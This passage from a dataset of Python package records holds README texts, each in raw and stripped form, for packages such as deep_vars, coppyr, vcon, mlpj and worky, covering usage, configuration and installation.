deep_vars:                 {'x': 17, 'y': Foo(x=19, y=None)}
deep_vars with maxdepth=2: {'x': 17, 'y': {'x': 19, 'y': None}}
```

Note that, because it covers objects of all classes, `deep_vars` might not product a dictionary. For example, if we define `foo` in the above code like this:

```python
foo = [Foo(17), ""foo"", 17]
```

the `vars` print would just raise an exception:

```
TypeError: vars() argument must have __dict__ attribute`
```

while the `deep_var` outputs will be:

```
deep_vars:                 [Foo(x=17, y=None), 'foo', 17]
deep_vars with maxdepth=2: [{'x': 17, 'y': None}, 'foo', 17]
```

## Configuration

`deep_vars` is meant to be simple to use, like `vars`, so its only arguments are the object being represented and the maximum depth down to witch the conversion should go.

However, there are various possibilities for configuring it for the whole project. This is done through the attributes of `DeepVars` class.

### Handlers

The main thing one can adjust is how various objects are handled. This is done by assigning ""handler types"". For example, this will cause all `float` and `str` attributes to remain hidden:

```python
DeepVars.set_handlers(DeepVarsHandlerHide, float, str)
```

There are several `DeepVarsHandler<something>` classes that can be used:

* `DeepVarsHandler`: Default class, used as a parent class for all the others. It should not be used directly.
* `DeepVarsHandlerShow`: Show the object as it is (i.e., don't process it).
* `DeepVarsHandlerHide`: Skip the attribute from the output. Note that this does not affect the top level call of `deep_vars`.
* `DeepVarsHandlerProcess`: Process it in the previously described manner (similar to `vars`).
* `DeepVarsHandlerLoop`: Loop the object (usually a list or a tuple) and process each item individually.
* `DeepVarsHandlerLoopDict`: Loop the object as a dictionary, using its `items` method (can be changed in inherited classes) and process each `(key, value)` pair individually.
* `DeepVarsHandlerCallable`: Special handler for callables, converting them to signature strings.

One can also configure the default handler for those attributes that are not individually set. For example, to have them show without any processing:

```python
DeepVars.default_handler = DeepVarsHandlerShow
```

Let us take another look at the above example:

```python
DeepVars.set_handlers(DeepVarsHandlerHide, float, str)
```

The first argument is a handler class. The rest of them describe the objects that this class is used for. These are usually types, but they can also be strings. The following are recognised:

* `""magic""`: A magic attribute. These are usually methods with names starting and ending in double underscores (for example, `__init__`), but `deep_vars` will consider any attribute, even non-callable ones, for the sake of output's consistency.

* `""private""`: Any object that has a name starting with an underscore (for example, `_private` or `__very_private`).

* `""callable""`: Any callable object (a function, a method, a `lambda`) except classes.

The handlers assignment is done in the same way as it is for type-based kinda of arguments:

```python
# Hide all ""callable"" arguments (not including classes):
DeepVars.set_handlers(DeepVarsHandlerHide, ""callable"")
# Hide all `float` and all ""callable"" arguments (not including classes):
DeepVars.set_handlers(DeepVarsHandlerHide, float, ""callable"")
```

### Further configuration specific to some handlers

Some of the handlers can be fine-tuned.

`DeepVarsHandlerLoopDict` normally uses object's `items()` method to go through its items. However, this can be replaced by changing `DeepVarsHandlerLoopDict.items_method_name` to something other than `""items""`. Further, if this other method requires arguments, these can be set up as a tuple `DeepVarsHandlerLoopDict.items_method_args` and a dictionary `DeepVarsHandlerLoopDict.items_method_kwargs`.

All container handlers (`DeepVarsHandlerLoopDict`, `DeepVarsHandlerLoop`, and `DeepVarsHandlerProcess`) and also have the filtering of their items turned on or off. If turned off (`class_name.allow_filtering = False`), their items will show even if their handler is set to `DeepVarsHandlerHide`. This is the default for (`DeepVarsHandlerLoopDict` and `DeepVarsHandlerLoop`. If the filtering is turned on (`class_name.allow_filtering = True`), their items will be hidden if their handler decides so (i.e., if it is set to `DeepVarsHandlerHide`). This is the default for `DeepVarsHandlerProcess`.

### Extending handlers

One can easily define their own special object types. Here is an example from the tests:

```python
def special_detector(name: Optional[str], obj: Any) -> Optional[str]:
    return (
        ""specially_detected""
        if getattr(obj, ""specially_detected"", False) else
        None
    )


DeepVars.special_type_detectors.append(special_detector)
DeepVars.set_handlers(DeepVarsHandlerSpecial, ""specially_detected"")
```

First, we need to define a callable (usually a function) that detects the special type of the argument. This callable takes attribute's name (either a string or `None`, the latter being used for the top level call of `deep_vars`) and the object itself, returning either a string used as the name for that kind of object or `None` if the object was not identified.

Second, we add this callable to the list `DeepVars.special_type_detectors`. The three predefined special types of arguments listed above are built-in, but `special_type_detectors` is checked before they are used, so its callables can override them.

Lastly, one needs to define how is this special is handled, which is done as shown above with ""callable"" arguments.

This allows one to extend the functionality of `deep_vars`. Arguably, this is not very useful in regular projects, but it can be used by other packages to offer `deep_vars` functionality extended to their own needs.
","# `deep_vars`

A package providing `deep_vars` function that serves a purpose similar to `vars`, but it works with any object and can recursively process attributes as well.

## Content

1. [Basic use](#basic-use)
2. [Configuration](#configuration)
    1. [Handlers](#handlers)
    2. [Further configuration specific to some handlers](#further-configuration-specific-to-some-handlers)
    3. [Extending handlers](#extending-handlers)

## Basic use

This is used in a way similar to `vars`. For example, the following code:

```python
from dataclasses import dataclass
from typing import Optional

from deep_vars import deep_vars


@dataclass
class Foo:
    x: int
    y: Optional[""Foo""] = None


foo = Foo(17, y=Foo(19))
print(""vars:                     "", vars(foo))
print(""deep_vars:                "", deep_vars(foo))
print(""deep_vars with maxdepth=2:"", deep_vars(foo, 2))
```

will print this:

```
vars:                      {'x': 17, 'y': Foo(x=19, y=None)}
deep_vars:                 {'x': 17, 'y': Foo(x=19, y=None)}
deep_vars with maxdepth=2: {'x': 17, 'y': {'x': 19, 'y': None}}
```

Note that, because it covers objects of all classes, `deep_vars` might not product a dictionary. For example, if we define `foo` in the above code like this:

```python
foo = [Foo(17), ""foo"", 17]
```

the `vars` print would just raise an exception:

```
TypeError: vars() argument must have __dict__ attribute`
```

while the `deep_var` outputs will be:

```
deep_vars:                 [Foo(x=17, y=None), 'foo', 17]
deep_vars with maxdepth=2: [{'x': 17, 'y': None}, 'foo', 17]
```

## Configuration

`deep_vars` is meant to be simple to use, like `vars`, so its only arguments are the object being represented and the maximum depth down to witch the conversion should go.

However, there are various possibilities for configuring it for the whole project. This is done through the attributes of `DeepVars` class.

### Handlers

The main thing one can adjust is how various objects are handled. This is done by assigning ""handler types"". For example, this will cause all `float` and `str` attributes to remain hidden:

```python
DeepVars.set_handlers(DeepVarsHandlerHide, float, str)
```

There are several `DeepVarsHandler` classes that can be used:

* `DeepVarsHandler`: Default class, used as a parent class for all the others. It should not be used directly.
* `DeepVarsHandlerShow`: Show the object as it is (i.e., don't process it).
* `DeepVarsHandlerHide`: Skip the attribute from the output. Note that this does not affect the top level call of `deep_vars`.
* `DeepVarsHandlerProcess`: Process it in the previously described manner (similar to `vars`).
* `DeepVarsHandlerLoop`: Loop the object (usually a list or a tuple) and process each item individually.
* `DeepVarsHandlerLoopDict`: Loop the object as a dictionary, using its `items` method (can be changed in inherited classes) and process each `(key, value)` pair individually.
* `DeepVarsHandlerCallable`: Special handler for callables, converting them to signature strings.

One can also configure the default handler for those attributes that are not individually set. For example, to have them show without any processing:

```python
DeepVars.default_handler = DeepVarsHandlerShow
```

Let us take another look at the above example:

```python
DeepVars.set_handlers(DeepVarsHandlerHide, float, str)
```

The first argument is a handler class. The rest of them describe the objects that this class is used for. These are usually types, but they can also be strings. The following are recognised:

* `""magic""`: A magic attribute. These are usually methods with names starting and ending in double underscores (for example, `__init__`), but `deep_vars` will consider any attribute, even non-callable ones, for the sake of output's consistency.

* `""private""`: Any object that has a name starting with an underscore (for example, `_private` or `__very_private`).

* `""callable""`: Any callable object (a function, a method, a `lambda`) except classes.

The handlers assignment is done in the same way as it is for type-based kinda of arguments:

```python
# Hide all ""callable"" arguments (not including classes):
DeepVars.set_handlers(DeepVarsHandlerHide, ""callable"")
# Hide all `float` and all ""callable"" arguments (not including classes):
DeepVars.set_handlers(DeepVarsHandlerHide, float, ""callable"")
```

### Further configuration specific to some handlers

Some of the handlers can be fine-tuned.

`DeepVarsHandlerLoopDict` normally uses object's `items()` method to go through its items. However, this can be replaced by changing `DeepVarsHandlerLoopDict.items_method_name` to something other than `""items""`. Further, if this other method requires arguments, these can be set up as a tuple `DeepVarsHandlerLoopDict.items_method_args` and a dictionary `DeepVarsHandlerLoopDict.items_method_kwargs`.

All container handlers (`DeepVarsHandlerLoopDict`, `DeepVarsHandlerLoop`, and `DeepVarsHandlerProcess`) and also have the filtering of their items turned on or off. If turned off (`class_name.allow_filtering = False`), their items will show even if their handler is set to `DeepVarsHandlerHide`. This is the default for (`DeepVarsHandlerLoopDict` and `DeepVarsHandlerLoop`. If the filtering is turned on (`class_name.allow_filtering = True`), their items will be hidden if their handler decides so (i.e., if it is set to `DeepVarsHandlerHide`). This is the default for `DeepVarsHandlerProcess`.

### Extending handlers

One can easily define their own special object types. Here is an example from the tests:

```python
def special_detector(name: Optional[str], obj: Any) -> Optional[str]:
    return (
        ""specially_detected""
        if getattr(obj, ""specially_detected"", False) else
        None
    )


DeepVars.special_type_detectors.append(special_detector)
DeepVars.set_handlers(DeepVarsHandlerSpecial, ""specially_detected"")
```

First, we need to define a callable (usually a function) that detects the special type of the argument. This callable takes attribute's name (either a string or `None`, the latter being used for the top level call of `deep_vars`) and the object itself, returning either a string used as the name for that kind of object or `None` if the object was not identified.

Second, we add this callable to the list `DeepVars.special_type_detectors`. The three predefined special types of arguments listed above are built-in, but `special_type_detectors` is checked before they are used, so its callables can override them.

Lastly, one needs to define how is this special is handled, which is done as shown above with ""callable"" arguments.

This allows one to extend the functionality of `deep_vars`. Arguably, this is not very useful in regular projects, but it can be used by other packages to offer `deep_vars` functionality extended to their own needs.
",vsego/deep-vars
geosdemo-haoyu,https://github.com/hniu-tamu/geosdemo-haoyu,0,437,437,"# geosdemo-haoyu


[![image](https://img.shields.io/pypi/v/geosdemo-haoyu.svg)](https://pypi.python.org/pypi/geosdemo-haoyu)
[![image](https://img.shields.io/conda/vn/conda-forge/geosdemo-haoyu.svg)](https://anaconda.org/conda-forge/geosdemo-haoyu)


**A python package for interactive mapping.**


-   Free software: MIT license
-   Documentation: https://hniu-tamu.github.io/geosdemo-haoyu
    

## Features

-   TODO
","# geosdemo-haoyu


[![image](https://img.shields.io/pypi/v/geosdemo-haoyu.svg)](https://pypi.python.org/pypi/geosdemo-haoyu)
[![image](https://img.shields.io/conda/vn/conda-forge/geosdemo-haoyu.svg)](https://anaconda.org/conda-forge/geosdemo-haoyu)


**A python package for interactive mapping.**


-   Free software: MIT license
-   Documentation: https://hniu-tamu.github.io/geosdemo-haoyu
    

## Features

-   TODO
",hniu-tamu/geosdemo-haoyu
coppyr,https://github.com/gshulegaard/coppyr,14,4267,4160,"
======
Coppyr
======

Coppyr (Copp-**er**) is a collecton of useful Python boilerplate that I find
myself reusing frequently between projects.

- subp_
- singleton_
   - Singleton_
   - Namespace_
- Context_
- lazyproperty_
- CoppyrError_


subp
----

``subp.call``
  Convenience wrapper around ``subprocess.run`` that abstracts many of the
  common options and features (such as ``subprocess.PIPE`` passing).

  ::
 
    >>> from coppyr import subp
    >>> retcode, stdout, stederr = subp.call(""lsb_release -a"")
    >>> print retcode
    0
    >>> print stdout
    ['Distributor ID:\tUbuntu', 'Description:\tUbuntu 18.04.3 LTS',
    'Release:\t18.04', 'Codename:\tbionic', '']
    >>> print stderr
    ['No LSB modules are available.', '']

  *Note*: ``STDOUT`` and ``STDERR`` are returned as ``List`` objects with each
  line as a ``String``.  This includes empty lines which become empty strings.


singleton
---------

.. _Singleton:

``singleton.Singleton``
  Base object that implements the Singleton pattern pythonically.  Future inits
  of this object will return previously the first created object.

  ::

    >>> from coppyr.types import Singleton
    >>> first = Singleton()
    >>> first
    <singleton.Singleton object at 0x7fa72df4cd30>
    >>> second = Singleton()
    >>> second
    <singleton.Singleton object at 0x7fa72df4cd30>

  This object can be used as a base class or mixin to add Singleton behavior to
  custom objects.

  **Warning:**  When inheriting from Singleton it is neccessary to override the
  ``_instance`` class attribute to ensure that you don't inadvertantly store your
  subclass instance in the parent class variable
  (``types.Singleton._instance``).  For the same reason, you should also
  override ``_init`` as well.

  ::

    class MySingletonClass(Singleton):
        _instance = None
        _init = False

.. _Namespace:

``singleton.Namespace``
  Simple Singleton object that stores KV pairs.

  ::

    >>> from coppyr.singleton import Namespace
    >>> ns = Namespace()
    >>> ns.foo = ""bar""
    >>> ns.foo
    'bar'
    >>> ns2 = Namespace()
    >>> ns2.foo
    'bar'

  Returns ``None`` if the key is not in the namespace.

  ::

    >>> ns.baz
    >>>

  **Warning:** Just like ``Singleton``, child objects should override the
  class ``_instance`` and ``_init`` attributes.

  __getattr__(self, attr)

    When an attribute does not exist, a ``Namespace`` will return ``None``
    instead of raising an ``AttributeError``.


Context
-------

``Context``
  This is intended as an interpreter local object that can store common state
  between executing threads/coroutines.  It's a convenient tool to provide
  access to shared utilities such as logging, environment information, and
  other shared utilities for an application.

  ::

    >>> from coppyr import Context
    >>> context = Context()
    >>> context.action_id
    '15_100000'
    >>> context.inc_action_id()
    >>> context.action_id
    '15_100001'


lazyproperty
------------

``lazyproperty``
  This is a decorator that will turn a class method into a property that is
  evaluated once.  This is a useful performance optimization for class elements
  that require computation but do not change overtime.

  ::

    >>> from coppyr import lazyproperty
    >>> class Foo:
    ...     def __init__(self):
    ...         self.a = 5
    ...         self.b = 6
    ...
    ...     @lazyproperty
    ...     def c(self):
    ...         return self.a + self.b
    ...
    >>> x = Foo()
    >>> x.c
    11
    >>> x.a = 6
    >>> x.c
    11  # c remains 11


CoppyrError
-----------

``CoppyrError``
  Simple boilerplate for readable, consistent, custom error messages.  Adds a
  `dict` representation that can be used for easy(ish) conversion to JSON for
  web use cases.

  ::

    >>> from coppyr import CoppyrError
    >>> class MyError(CoppyrError):
    ...     description = ""Doom 2: Hell on earth.""
    ... 
    >>> err = MyError()
    >>> raise err
    Traceback (most recent call last):
    File ""<stdin>"", line 1, in <module>
    __main__.MyError: Doom 2: Hell on earth.
    >>> err
    MyError(message=Doom 2: Hell on earth., payload={})
    >>> err.to_dict()
    {'error': 'MyError', 'message': 'Doom 2: Hell on earth.', 'payload': {}}
 
","
======
Coppyr
======

Coppyr (Copp-**er**) is a collecton of useful Python boilerplate that I find
myself reusing frequently between projects.

- subp_
- singleton_
   - Singleton_
   - Namespace_
- Context_
- lazyproperty_
- CoppyrError_


subp
----

``subp.call``
  Convenience wrapper around ``subprocess.run`` that abstracts many of the
  common options and features (such as ``subprocess.PIPE`` passing).

  ::
 
    >>> from coppyr import subp
    >>> retcode, stdout, stederr = subp.call(""lsb_release -a"")
    >>> print retcode
    0
    >>> print stdout
    ['Distributor ID:\tUbuntu', 'Description:\tUbuntu 18.04.3 LTS',
    'Release:\t18.04', 'Codename:\tbionic', '']
    >>> print stderr
    ['No LSB modules are available.', '']

  *Note*: ``STDOUT`` and ``STDERR`` are returned as ``List`` objects with each
  line as a ``String``.  This includes empty lines which become empty strings.


singleton
---------

.. _Singleton:

``singleton.Singleton``
  Base object that implements the Singleton pattern pythonically.  Future inits
  of this object will return previously the first created object.

  ::

    >>> from coppyr.types import Singleton
    >>> first = Singleton()
    >>> first
    
    >>> second = Singleton()
    >>> second
    

  This object can be used as a base class or mixin to add Singleton behavior to
  custom objects.

  **Warning:**  When inheriting from Singleton it is neccessary to override the
  ``_instance`` class attribute to ensure that you don't inadvertantly store your
  subclass instance in the parent class variable
  (``types.Singleton._instance``).  For the same reason, you should also
  override ``_init`` as well.

  ::

    class MySingletonClass(Singleton):
        _instance = None
        _init = False

.. _Namespace:

``singleton.Namespace``
  Simple Singleton object that stores KV pairs.

  ::

    >>> from coppyr.singleton import Namespace
    >>> ns = Namespace()
    >>> ns.foo = ""bar""
    >>> ns.foo
    'bar'
    >>> ns2 = Namespace()
    >>> ns2.foo
    'bar'

  Returns ``None`` if the key is not in the namespace.

  ::

    >>> ns.baz
    >>>

  **Warning:** Just like ``Singleton``, child objects should override the
  class ``_instance`` and ``_init`` attributes.

  __getattr__(self, attr)

    When an attribute does not exist, a ``Namespace`` will return ``None``
    instead of raising an ``AttributeError``.


Context
-------

``Context``
  This is intended as an interpreter local object that can store common state
  between executing threads/coroutines.  It's a convenient tool to provide
  access to shared utilities such as logging, environment information, and
  other shared utilities for an application.

  ::

    >>> from coppyr import Context
    >>> context = Context()
    >>> context.action_id
    '15_100000'
    >>> context.inc_action_id()
    >>> context.action_id
    '15_100001'


lazyproperty
------------

``lazyproperty``
  This is a decorator that will turn a class method into a property that is
  evaluated once.  This is a useful performance optimization for class elements
  that require computation but do not change overtime.

  ::

    >>> from coppyr import lazyproperty
    >>> class Foo:
    ...     def __init__(self):
    ...         self.a = 5
    ...         self.b = 6
    ...
    ...     @lazyproperty
    ...     def c(self):
    ...         return self.a + self.b
    ...
    >>> x = Foo()
    >>> x.c
    11
    >>> x.a = 6
    >>> x.c
    11  # c remains 11


CoppyrError
-----------

``CoppyrError``
  Simple boilerplate for readable, consistent, custom error messages.  Adds a
  `dict` representation that can be used for easy(ish) conversion to JSON for
  web use cases.

  ::

    >>> from coppyr import CoppyrError
    >>> class MyError(CoppyrError):
    ...     description = ""Doom 2: Hell on earth.""
    ... 
    >>> err = MyError()
    >>> raise err
    Traceback (most recent call last):
    File """", line 1, in 
    __main__.MyError: Doom 2: Hell on earth.
    >>> err
    MyError(message=Doom 2: Hell on earth., payload={})
    >>> err.to_dict()
    {'error': 'MyError', 'message': 'Doom 2: Hell on earth.', 'payload': {}}
 
",gshulegaard/coppyr
sitesweeper,https://github.com/radityaharya/sitesweeper,5,445,445,"
# sitesweeper

SiteSweeper is a Python command-line interface (CLI) tool for crawling websites and generating output files. It supports crawling a website with a given depth, and saving the output in either a single PDF file or a folder of individual PDF files.


## Installation

Install sitesweeper with pip

```bash
  pip install sitesweeper
```
    
## Usage

```bash
python3.9 -m sitesweeper https://example.com --output-path example
```

","
# sitesweeper

SiteSweeper is a Python command-line interface (CLI) tool for crawling websites and generating output files. It supports crawling a website with a given depth, and saving the output in either a single PDF file or a folder of individual PDF files.


## Installation

Install sitesweeper with pip

```bash
  pip install sitesweeper
```
    
## Usage

```bash
python3.9 -m sitesweeper https://example.com --output-path example
```

",radityaharya/sitesweeper
mlpj,https://github.com/bdanielby/mlpj,7,965,965,"# mlpj: Tools for machine learning projects

Installation of the [PyPi package](https://pypi.org/project/mlpj):

  `pip install -U mlpj`

Contents of this repository:
* Utilities and convenience functions for various libraries and purposes:
  * [python_utils](mlpj/python_utils.py): for the Python standard library
  * [numpy_utils](mlpj/numpy_utils.py): for `numpy`
  * [pandas_utils](mlpj/pandas_utils.py): for `pandas`
  * [plot_utils](mlpj/plot_utils.py): for `matplotlib`
  * [timeseries_utils](mlpj/timeseries_utils.py): for timeseries models
  * [ml_utils](mlpj/ml_utils.py): for `sklearn` and other standard machine
    learning libraries
* [project_utils](mlpj/project_utils.py): project management utilities
  * [actions_looper](mlpj/actions_looper.py): Execute selected parts of your
    program based on persisted results of earlier steps.
  * [result_display](mlpj/result_display.py): Collect textual and numerical
    results and plots on HTML pages.
","# mlpj: Tools for machine learning projects

Installation of the [PyPi package](https://pypi.org/project/mlpj):

  `pip install -U mlpj`

Contents of this repository:
* Utilities and convenience functions for various libraries and purposes:
  * [python_utils](mlpj/python_utils.py): for the Python standard library
  * [numpy_utils](mlpj/numpy_utils.py): for `numpy`
  * [pandas_utils](mlpj/pandas_utils.py): for `pandas`
  * [plot_utils](mlpj/plot_utils.py): for `matplotlib`
  * [timeseries_utils](mlpj/timeseries_utils.py): for timeseries models
  * [ml_utils](mlpj/ml_utils.py): for `sklearn` and other standard machine
    learning libraries
* [project_utils](mlpj/project_utils.py): project management utilities
  * [actions_looper](mlpj/actions_looper.py): Execute selected parts of your
    program based on persisted results of earlier steps.
  * [result_display](mlpj/result_display.py): Collect textual and numerical
    results and plots on HTML pages.
",bdanielby/mlpj
local-dialog-workflow-python-backend,https://github.com/javatechy/dokr,0,50,50,"This is a package for running the dialog workflow
","This is a package for running the dialog workflow
",javatechy/dokr
grn-stability-selection,https://github.com/soelmicheletti/grn-stability-selection,4,26,26,"GRN - Stability Selection
","GRN - Stability Selection
",soelmicheletti/grn-stability-selection
local-bert-python-backend,https://github.com/javatechy/dokr,0,84,84,"This is a package for sharing common Logger function used in different repositories
","This is a package for sharing common Logger function used in different repositories
",javatechy/dokr
pythonsdk,https://github.com/lijok/python-sdk,0,154,154,"# python-sdk

## Requirements
Python 3.10+

## Installation
```console
pip install pythonsdk

# If using AWS functionality
pip install pythonsdk[aws]
```
","# python-sdk

## Requirements
Python 3.10+

## Installation
```console
pip install pythonsdk

# If using AWS functionality
pip install pythonsdk[aws]
```
",lijok/python-sdk
vcon,https://github.com/vcon-dev/vcon,8,3174,3169,"# The Home Repo for vCons and the Conserver

## Introduction
vCons are PDFs for human conversations, defining them so they can be shared, analyzed and secured. The Conserver is a domain specific data platform based on vCons, converting the raw materials of recorded conversations into self-serve data sources for any team. The Conserver represents the most modern set of tools for data engineers to responsibly and scalably use customer conversations in data pipelines. 

The Vcon library consists of two primary components:

  * The Python Vcon package for constructing and operating on Vcon objects
  * The Conserver for storing, managing and manipulating Vcon objects and operation streams on Vcon objects

## Table of Contents

  + [Presentations, Whitepapers and Tutorials](#presentations-whitepapers-and-tutorials)
  + [vCon Library Quick Start for Python](https://github.com/vcon-dev/vcon/wiki/Library-Quick-Start)
  + [Testing the Vcon Package](#testing-the-vcon-package)
  + [Testing the conserver](#testing-the-conserver)

## Presentations, Whitepapers and Tutorials

See the [Birds of a Feather session at IETF 116, Yokohama](https://youtu.be/EF2OMbo6Qj4)

See the [presentation at TADSummit](https://youtu.be/ZBRJ6FcVblc)

See the [presentation at IETF](https://youtu.be/dJsPzZITr_g?t=243)

See the [presentation at IIT](https://youtu.be/s-pjgpBOQqc)

Read the [IETF draft proposal](https://datatracker.ietf.org/doc/html/draft-petrie-vcon-01)

Read the [white paper](https://docs.google.com/document/d/1TV8j29knVoOJcZvMHVFDaan0OVfraH_-nrS5gW4-DEA/edit?usp=sharing)

See the [key note proposal for vCons](https://blog.tadsummit.com/2021/12/08/strolid-keynote-vcons/).


## Testing the Vcon Package
A suite of pytest unit tests exist for the Vcon package in: [tests](tests)

These can be run using the following command in the current directory:

    pytest -v -rP tests


Please also run separately the following unit test as it will check for spurious stdout from the Vcon package that will likely cause the CLI to break:

    pytest -v -rP tests/test_vcon_cli.py

Note: These errors may not show up when you run test_vcon_cli.py with the rest of the unit tests as some stdout may only occur when the Vcon package is first imported and may not get trapped/detected by other unit tests.


## Testing the conserver
A suite of pytest unit tests exist for the conserver in: [server/tests](server/tests)

Running and testing the conserver requires a running instance of Redis.
Be sure to create and edit your server/.env file to reflect your redis server address and port.
It can be generated like the following command line:

    cat <<EOF>.env
    #!/usr/bin/sh
    export AWS_BUCKET=vcon-storage
    export AWS_KEY_ID=aaaaaaaaaaaaaaa
    export AWS_SECRET_KEY=bbbbbbbbbbb
    export DEEPGRAM_KEY=ccccccccccccc
    export ENV=dev
    export HOSTNAME=http://0.0.0.0:8000
    export REDIS_URL=redis://172.17.0.4:6379
    #export MONOREPO_DATABASE_URL=postgresql://password:userid@your.postgres.domain.com:5432/postgres
    EOF

The unit tests for the conserver can be run using the following command in the server directory:

    source .env
    pytest -v -rP tests

","# The Home Repo for vCons and the Conserver

## Introduction
vCons are PDFs for human conversations, defining them so they can be shared, analyzed and secured. The Conserver is a domain specific data platform based on vCons, converting the raw materials of recorded conversations into self-serve data sources for any team. The Conserver represents the most modern set of tools for data engineers to responsibly and scalably use customer conversations in data pipelines. 

The Vcon library consists of two primary components:

  * The Python Vcon package for constructing and operating on Vcon objects
  * The Conserver for storing, managing and manipulating Vcon objects and operation streams on Vcon objects

## Table of Contents

  + [Presentations, Whitepapers and Tutorials](#presentations-whitepapers-and-tutorials)
  + [vCon Library Quick Start for Python](https://github.com/vcon-dev/vcon/wiki/Library-Quick-Start)
  + [Testing the Vcon Package](#testing-the-vcon-package)
  + [Testing the conserver](#testing-the-conserver)

## Presentations, Whitepapers and Tutorials

See the [Birds of a Feather session at IETF 116, Yokohama](https://youtu.be/EF2OMbo6Qj4)

See the [presentation at TADSummit](https://youtu.be/ZBRJ6FcVblc)

See the [presentation at IETF](https://youtu.be/dJsPzZITr_g?t=243)

See the [presentation at IIT](https://youtu.be/s-pjgpBOQqc)

Read the [IETF draft proposal](https://datatracker.ietf.org/doc/html/draft-petrie-vcon-01)

Read the [white paper](https://docs.google.com/document/d/1TV8j29knVoOJcZvMHVFDaan0OVfraH_-nrS5gW4-DEA/edit?usp=sharing)

See the [key note proposal for vCons](https://blog.tadsummit.com/2021/12/08/strolid-keynote-vcons/).


## Testing the Vcon Package
A suite of pytest unit tests exist for the Vcon package in: [tests](tests)

These can be run using the following command in the current directory:

    pytest -v -rP tests


Please also run separately the following unit test as it will check for spurious stdout from the Vcon package that will likely cause the CLI to break:

    pytest -v -rP tests/test_vcon_cli.py

Note: These errors may not show up when you run test_vcon_cli.py with the rest of the unit tests as some stdout may only occur when the Vcon package is first imported and may not get trapped/detected by other unit tests.


## Testing the conserver
A suite of pytest unit tests exist for the conserver in: [server/tests](server/tests)

Running and testing the conserver requires a running instance of Redis.
Be sure to create and edit your server/.env file to reflect your redis server address and port.
It can be generated like the following command line:

    cat <.env
    #!/usr/bin/sh
    export AWS_BUCKET=vcon-storage
    export AWS_KEY_ID=aaaaaaaaaaaaaaa
    export AWS_SECRET_KEY=bbbbbbbbbbb
    export DEEPGRAM_KEY=ccccccccccccc
    export ENV=dev
    export HOSTNAME=http://0.0.0.0:8000
    export REDIS_URL=redis://172.17.0.4:6379
    #export MONOREPO_DATABASE_URL=postgresql://password:userid@your.postgres.domain.com:5432/postgres
    EOF

The unit tests for the conserver can be run using the following command in the server directory:

    source .env
    pytest -v -rP tests

",vcon-dev/vcon
worky,https://github.com/ZappaBoy/worky,1,5367,5272,"# Worky
Manage your workspaces and increase your productivity.

## What is Worky?
Worky is a tool that helps to define and load project workspaces. It can be used to load a project workspace with a single command and quickly start your work.
Worky saves you from wasting time doing repetitive tasks before actually starting to work.
This project can be used for every type of project or workspace, the only limitation is due to the functionality of the programs that you can run from CLI.

<img alt=""Demo gif"" src=""https://s11.gifyu.com/images/worky_demo_compressed.gif"" width=""100%""/>

## Future improvements
Please note that this is a work-in-progress tool. If you have any ideas or suggestions, please open an issue or a pull request.
Any helps is appreciated. Here is a list of future improvements:
- [ ] Add the window manager support to open programs in a specific workspace/monitor.

## Installation
This project uses [Poetry](https://python-poetry.org/) to manage dependencies and packaging and it is available on [PyPI](https://pypi.org/project/worky/).
To install it, simply run:
```shell
pip install worky
```
### For Arch Linux Repository users
If you are on an arch-based distro and can access to the [Arch Linux Repository (AUR)](https://aur.archlinux.org/) you can install [worky](https://aur.archlinux.org/packages/worky) using an AUR helper like [yay](https://github.com/Jguer/yay):
```shell
yay -S worky
```

## Configuration
If you prefer a practical way to understand how to worky configuration works, you can take a look at the [examples directory](https://github.com/ZappaBoy/worky/tree/main/examples).

### Worky configuration file
There are multiple ways to configure worky:
 1. Worky automatically looks for a `.worky.toml` file in the current directory where is called.
 2. You can create a `~/.config/worky/{{project_name}}.toml` file and worky will automatically look for it when you run `worky project_name`.
    For example, if you have a project named `my_project` you can create a `~/.config/worky/my_project/config.toml` file and use `worky my_project` to load the project workspace.
 3. You can create a subdirectory named as your project (`project_name`) under the `~/.config/worky/`. Here you can put your `config.toml` file and worky will look for it when you run `worky project_name`.
    For example, if you have a project named `my_project` you can create a `~/.config/worky/my_project/config.toml` file and use `worky my_project` to load the project workspace.
 4. You can specify a configuration file using the `-c` flag followed by the path of the config file (see `worky --help` for more details).

### Variables
Variables can be defined in the `[variables]` section of the configuration file. The variable's value is the command to be executed.
The variables can be used in all the config file except for the steps name.
The value of the variables used in the step name defines the command that will be executed. See the [steps section](#steps) for more details.

### Steps
The steps are the commands that will be executed when you load the workspace. The command is defined by the step name using a variable.
For example, if you have a variable named `backend` with the value `idea` you can define a step named `backend` and worky will run the idea IDE.

#### Args
Steps can have an `args` property that is a list of arguments to be passed to the command when it is executed.
An example of an argument can be the path of the project to open but this strictly depends on the program that you want to load.

#### Condition
Steps can have a `condition` property that is the name of a flag that you can pass when you run worky that defines if the step should be executed or not.
For example, if you want to run a `docker-compose` command only if you pass the `-f docker` flag you can define a step like this:
```toml
[variables]
compose = ""docker-compose""

[compose]
condition = ""docker""
args = [
    ""-f"",
    ""/path/to/docker-compose.yaml"",
    ""up""
]
```
Then you can run `worky -f docker` to load the workspace and run the `compose` step.

## Limitations
Worky configuration depends on the [TOML](https://toml.io/en/) syntax. This means that you can't create two steps with the same name.
You can crate two different steps using variables with the same value. Moreover, this helps to keep the configuration file clean and readable.

## Usage
After installing and configured worky, you can use it to load your project workspace simply by running:
```shell
worky  # If you have a .worky.toml file in the current directory
# or
worky {{project_name}}  # If you have a config file in ~/.config/worky/{{project_name}}/config.toml or ~/.config/worky/{{project_name}}.toml
# or
worky -c {{path_to_config_file}}  # Defining a custom config file
```

## For developers
Install dependencies:
```shell
pyenv local 3.10 # Or higher like 3.11.1
poetry use env 3.10
poetry install
poetry run worky {{your_command_args}}
```

After you have made your changes, if you have changed something in the `pyproject.toml` use `poetry2setup` dev dependency to update `setup.py`:
```shell
poetry2setup > setup.py
```

Then build the package with `poetry build` and create a PR with your changes if there are no issues.

# Buy me a coffee
If you appreciate my work I will appreciate if you [buy me a coffee](https://github.com/sponsors/ZappaBoy).
","# Worky
Manage your workspaces and increase your productivity.

## What is Worky?
Worky is a tool that helps to define and load project workspaces. It can be used to load a project workspace with a single command and quickly start your work.
Worky saves you from wasting time doing repetitive tasks before actually starting to work.
This project can be used for every type of project or workspace, the only limitation is due to the functionality of the programs that you can run from CLI.



## Future improvements
Please note that this is a work-in-progress tool. If you have any ideas or suggestions, please open an issue or a pull request.
Any helps is appreciated. Here is a list of future improvements:
- [ ] Add the window manager support to open programs in a specific workspace/monitor.

## Installation
This project uses [Poetry](https://python-poetry.org/) to manage dependencies and packaging and it is available on [PyPI](https://pypi.org/project/worky/).
To install it, simply run:
```shell
pip install worky
```
### For Arch Linux Repository users
